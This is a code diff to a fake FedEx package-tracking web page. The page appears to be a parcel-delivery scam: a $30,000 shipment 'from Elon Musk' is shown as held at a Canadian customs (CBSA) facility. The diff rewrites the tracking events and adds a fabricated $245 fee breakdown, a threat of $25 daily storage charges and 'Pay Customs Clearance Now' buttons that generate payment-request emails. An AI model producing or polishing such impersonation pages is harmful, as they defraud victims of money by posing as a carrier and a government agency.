@@ -1350,10 +1350,10 @@
       packages: [
         {
           tracking_number: 'FX261008JL',
-          status: 'in_transit',
+          status: 'awaiting_clearance',
           service_type: 'FedEx International Priority',
-          current_location: 'Buffalo, NY FedEx Hub',
-          estimated_delivery: '2026-01-15 5:30 PM',
+          current_location: 'CBSA Customs Facility, Ontario, Canada',
+          estimated_delivery: 'Pending Customs Clearance',
           ship_date: '2026-01-14',
           weight: '4500',
           dimensions: '96" x 120" x 72"',
@@ -1361,10 +1361,10 @@
           contents: '$30,000',
           reference_number: 'HIGH-VALUE-SHIPMENT-DT',
           insurance_coverage: 30000.00,
-          progress_percentage: 65,
+          progress_percentage: 50,
           requires_clearance: true,
-          clearance_payment_received: 200,
-          clearance_payment_required: 500,
+          clearance_payment_received: 0,
+          clearance_payment_required: 245,
           sender_name: 'Elon Musk',
           sender_company: 'FedEx Office Paris',
           sender_address: '1 Rocket Road',
@@ -1381,53 +1381,23 @@
       tracking_events: [
         {
           tracking_number: 'FX261008JL',
-          status: 'registered',
-          location: 'HAWTHORNE, TX',
-          event_date: '2026-01-14',
+          status: 'awaiting_clearance',
+          location: 'CBSA CUSTOMS FACILITY, ONTARIO, CANADA',
+          event_date: '2026-01-16',
           event_time: '10:30:00',
-          description: 'Package has been registered at the FedEx facility and secured. Awaiting recipient clearance for processing.',
+          description: 'Package arrived in Canada and is currently held at the CBSA customs office for inspection and regulatory compliance checks.',
           is_latest: false,
-          event_type: 'status_update'
+          event_type: 'customs_hold'
         },
         {
           tracking_number: 'FX261008JL',
           status: 'awaiting_clearance',
-          location: 'HAWTHORNE, TX',
-          event_date: '2026-01-14',
-          event_time: '08:45:00',
-          description: 'Shipment is currently on hold pending recipient clearance approval prior to final processing and residential delivery.',
-          is_latest: false,
-          event_type: 'clearance_hold'
-        },
-        {
-          tracking_number: 'FX261008JL',
-          status: 'clearance_partial',
-          location: 'HAWTHORNE, TX',
-          event_date: '2026-01-14',
-          event_time: '14:20:00',
-          description: 'Partial clearance payment of $200 received. Package authorized for initial processing and routing.',
-          is_latest: false,
-          event_type: 'payment_received'
-        },
-        {
-          tracking_number: 'FX261008JL',
-          status: 'in_transit',
-          location: 'MEMPHIS, TN',
-          event_date: '2026-01-14',
-          event_time: '18:45:00',
-          description: 'Package departed Memphis International Hub. En route to Buffalo, NY sorting facility.',
-          is_latest: false,
-          event_type: 'departure'
-        },
-        {
-          tracking_number: 'FX261008JL',
-          status: 'in_transit',
-          location: 'BUFFALO, NY',
-          event_date: '2026-01-15',
-          event_time: '03:30:00',
-          description: 'Package arrived at Buffalo, NY FedEx Hub. Cleared customs and awaiting final routing to Toronto.',
+          location: 'CBSA CUSTOMS FACILITY, ONTARIO, CANADA',
+          event_date: '2026-01-16',
+          event_time: '14:45:00',
+          description: 'Customs clearance required. A fee of $245 is needed for customs and regulatory compliance clearance, including tax and VAT.',
           is_latest: true,
-          event_type: 'arrival'
+          event_type: 'clearance_required'
         }
       ],
 
@@ -1618,7 +1588,7 @@
               </button>
               ${data.requires_clearance ? `
               <button onclick="requestClearance('${data.tracking_number}')" class="bg-fedex-blue text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
-                <i class="fas fa-unlock mr-1 sm:mr-2"></i>Request Clearance
+                <i class="fas fa-unlock mr-1 sm:mr-2"></i>Pay Customs Clearance
               </button>
               ` : ''}
             </div>
@@ -1636,30 +1606,75 @@
           </div>
 
           ${data.requires_clearance && data.clearance_payment_received < data.clearance_payment_required ? `
-          <!-- Updated Clearance Notice -->
-          <div class="clearance-notice rounded-lg p-3 sm:p-4">
+          <!-- Customs Clearance Required -->
+          <div class="clearance-notice rounded-lg p-3 sm:p-4 mb-4 sm:mb-6">
             <div class="flex items-start space-x-2 sm:space-x-3">
-              <i class="fas fa-info-circle text-yellow-600 text-lg sm:text-xl mt-1"></i>
+              <i class="fas fa-exclamation-triangle text-yellow-600 text-lg sm:text-xl mt-1"></i>
               <div>
-                <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">Payment Update - Shipment Released</h4>
-                <p class="text-yellow-700 text-xs sm:text-sm mb-2">
-                  ✅ <strong>Partial payment of $${data.clearance_payment_received} received</strong> out of the required $${data.clearance_payment_required}.
-                  Your package has been authorized for processing and is currently in transit.
-                </p>
-                <p class="text-yellow-700 text-xs sm:text-sm mb-2">
-                  📦 <strong>Package Status:</strong> IN TRANSIT - Currently at ${data.current_location} (approximately 4 hours from delivery address)
-                </p>
-                <p class="text-yellow-700 text-xs sm:text-sm mb-2">
-                  ⚠️ <strong>Important:</strong> Outstanding balance of $${data.clearance_payment_required - data.clearance_payment_received} must be settled within 24 hours (by Jan 15, 2026, 2:20 PM) to avoid:
-                </p>
-                <ul class="text-yellow-700 text-xs sm:text-sm ml-4 mb-2">
-                  <li>• Daily storage fee of $25 (FedEx priority storage policy)</li>
-                  <li>• Potential delivery delays or complications</li>
-                  <li>• Additional clearance processing fees</li>
-                </ul>
-                <p class="text-yellow-700 text-xs sm:text-sm">
-                  📍 <strong>Next Milestone:</strong> Package will proceed to Mississauga, ON sorting facility upon full payment clearance. Expected delivery: Jan 15, 2026 by 5:30 PM
-                </p>
+                <h4 class="font-bold text-yellow-800 mb-2 sm:mb-3 text-sm sm:text-base">CUSTOMS CLEARANCE REQUIRED</h4>
+                
+                <div class="mb-3 sm:mb-4">
+                  <p class="text-yellow-700 text-xs sm:text-sm mb-2">
+                    Your shipment is currently held at the <strong>Canada Border Services Agency (CBSA) customs facility</strong> 
+                    pending final regulatory clearance and payment.
+                  </p>
+                  <p class="text-yellow-700 text-xs sm:text-sm">
+                    A customs clearance fee of <strong class="text-red-600">$245</strong> is required to release the package for final delivery.
+                  </p>
+                </div>
+                
+                <div class="bg-white bg-opacity-50 rounded p-3 sm:p-4 mb-3 sm:mb-4">
+                  <h5 class="font-semibold text-yellow-800 mb-2 text-xs sm:text-sm">PAYMENT BREAKDOWN:</h5>
+                  <div class="grid grid-cols-2 gap-2 text-xs sm:text-sm">
+                    <div class="flex justify-between">
+                      <span class="text-yellow-700">Customs Processing Fee:</span>
+                      <span class="font-bold">$85.00</span>
+                    </div>
+                    <div class="flex justify-between">
+                      <span class="text-yellow-700">Import Tax & VAT:</span>
+                      <span class="font-bold">$140.00</span>
+                    </div>
+                    <div class="flex justify-between">
+                      <span class="text-yellow-700">Regulatory Compliance:</span>
+                      <span class="font-bold">$20.00</span>
+                    </div>
+                    <div class="col-span-2 border-t border-yellow-200 mt-1 pt-1">
+                      <div class="flex justify-between font-bold text-yellow-800">
+                        <span>TOTAL REQUIRED:</span>
+                        <span>$245.00</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="bg-red-50 border-l-3 border-red-500 p-2 sm:p-3 rounded-r">
+                  <p class="text-red-700 text-xs sm:text-sm font-semibold mb-1">
+                    ⚠️ IMPORTANT NOTICE:
+                  </p>
+                  <p class="text-red-700 text-xs sm:text-sm">
+                    If the $245 clearance fee is not paid today, an additional <strong>$25 daily storage fee</strong> 
+                    will be applied starting tomorrow until payment is received.
+                  </p>
+                </div>
+                
+                <div class="mt-3 sm:mt-4">
+                  <p class="text-yellow-700 text-xs sm:text-sm">
+                    Once payment is received, your package will be immediately released and scheduled for delivery to:
+                    <br>
+                    <span class="font-semibold">${data.recipient_address}, ${data.recipient_city}</span>
+                  </p>
+                </div>
+                
+                <div class="mt-3 sm:mt-4 flex flex-col sm:flex-row gap-2 sm:gap-3">
+                  <button onclick="requestClearance('${data.tracking_number}')" 
+                          class="fedex-button text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold text-xs sm:text-base">
+                    <i class="fas fa-credit-card mr-1 sm:mr-2"></i>Pay Customs Clearance Now
+                  </button>
+                  <button onclick="showPage('contact')" 
+                          class="border border-yellow-600 text-yellow-700 px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-yellow-50 transition-colors text-xs sm:text-base">
+                    <i class="fas fa-phone mr-1 sm:mr-2"></i>Contact Customs Support
+                  </button>
+                </div>
               </div>
             </div>
           </div>
@@ -1733,7 +1748,7 @@
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Clearance Status:</span>
-                  <span class="font-semibold text-fedex-orange">Partial ($${data.clearance_payment_received}/$${data.clearance_payment_required})</span>
+                  <span class="font-semibold text-fedex-orange">Pending ($${data.clearance_payment_received}/$${data.clearance_payment_required})</span>
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Reference:</span>
@@ -1788,7 +1803,7 @@
 
                   <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
                     <div class="text-xs text-fedex-gray">Current Location</div>
-                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">Buffalo, NY (4 hours away)</div>
+                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">CBSA Customs, Ontario (On Hold)</div>
                   </div>
                 </div>
               </div>
@@ -1825,17 +1840,17 @@
         return;
       }
 
-      const subject = `Clearance Request for Package ${trackingNumber}`;
+      const subject = `Clearance Payment for Package ${trackingNumber}`;
       const body = `Dear FedEx Team,
 
-I am requesting clearance for my high-value package with tracking number: ${trackingNumber}
+I am ready to pay the customs clearance fee for my package with tracking number: ${trackingNumber}
 
 Package Details:
 - Tracking Number: ${trackingNumber}
 - Contents: ${packageData.contents}
 - Declared Value: $${packageData.declared_value.toLocaleString()} USD
 - Current Location: ${packageData.current_location}
-- Outstanding Payment: $${packageData.clearance_payment_required - packageData.clearance_payment_received}
+- Required Payment: $${packageData.clearance_payment_required}
 
 Recipient Information:
 - Name: ${packageData.recipient_name}
@@ -1843,9 +1858,9 @@ Recipient Information:
 - Phone: ${packageData.recipient_phone}
 - Email: ${packageData.recipient_email}
 
-I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process and international shipping.
+I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the customs clearance process upon payment confirmation.
 
-Please let me know if you need any additional documentation or verification.
+Please provide payment instructions for the $245 customs clearance fee.
 
 Thank you,
 ${packageData.recipient_name}`;
@@ -1855,7 +1870,7 @@ ${packageData.recipient_name}`;
       // Open Gmail in new tab
       window.open(gmailUrl, '_blank');
       
-      showNotification('Opening Gmail to send clearance request...', 'info');
+      showNotification('Opening Gmail to send clearance payment request...', 'info');
     }
 
     // Basic form functions
